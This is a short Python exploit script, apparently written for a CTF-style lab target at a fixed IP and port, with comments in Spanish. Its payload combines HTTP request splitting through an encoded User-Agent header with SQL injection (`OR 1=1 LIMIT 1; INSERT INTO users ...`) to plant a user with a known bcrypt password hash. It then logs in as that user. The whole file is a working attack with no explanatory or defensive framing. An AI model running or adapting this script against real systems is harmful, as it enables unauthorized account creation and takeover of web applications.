import requests

target = "94.237.62.147"
port = "36063"
password = "test"
username="test"

code = f"""Mozilla/7.0

{\"username\":\"{username}\' OR 1=1 LIMIT 1; INSERT INTO users (username, password) VALUES (\'{username}\',\'$2a$10$y89CqMDSdAt3dpGLZ5myKeL.tu1JqCcclArfgHUyPB4xzzeliuPJ6\')-- -\",\"password\":\"{password}\"}"""
# Usuario y contraseña es "test", pero la contraseña se encuentra hasheada

code = code.replace("\r","").replace("\n","%0D%0A").replace(" ","%20").replace("\'","%27")
# Para que se modifique el Content-Length y calce con el request splitting
maxLength = len(code)
data = "username=a&password="+maxLength*"a"

headers = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": code}
proxy = {"http":"http://localhost:8080"}
#proxy = {"":""}

data2 = f"username={username}&password={username}"
headers2 = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent":"Mozilla/7.0"}

req = requests.post(f"http://{target}:{port}/user", data=data, headers=headers, proxies=proxy)
req2 = requests.post(f"http://{target}:{port}/user", data=data2, headers=headers2, proxies=proxy)
#print(req.text)
print(req2.text)
